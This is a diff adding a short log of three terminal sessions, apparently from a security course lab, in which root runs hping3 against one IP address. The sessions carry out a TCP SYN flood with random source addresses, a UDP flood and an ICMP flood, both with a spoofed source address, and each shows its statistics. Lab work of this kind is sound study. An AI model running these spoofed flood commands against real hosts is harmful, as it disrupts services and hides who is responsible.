@@ -1,0 +1,26 @@
+1) 
+root@comp3134Winter2024:/var/www/html# hping3 -S -c 10000 -p 80 --rand-source 146.190.242.155
+HPING 146.190.242.155 (eth0 146.190.242.155): S set, 40 headers + 0 data bytes
+^C
+--- 146.190.242.155 hping statistic ---
+1555 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@comp3134Winter2024:/var/www/html#
+
+2)
+root@comp3134Winter2024:/var/www/html# hping3 --udp -c 9000 --faster -p 80 -a 192.168.1.100 146.190.242.155
+HPING 146.190.242.155 (eth0 146.190.242.155): udp mode set, 28 headers + 0 data bytes
+
+--- 146.190.242.155 hping statistic ---
+9000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@comp3134Winter2024:/var/www/html#
+
+3)
+root@comp3134Winter2024:/var/www/html# hping3 --icmp -c 11000 --interval u75000 -d 1 -p 80 -a 192.168.1.100 146.190.242.155
+HPING 146.190.242.155 (eth0 146.190.242.155): icmp mode set, 28 headers + 1 data bytes
+^C
+--- 146.190.242.155 hping statistic ---
+1939 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@comp3134Winter2024:/var/www/html#
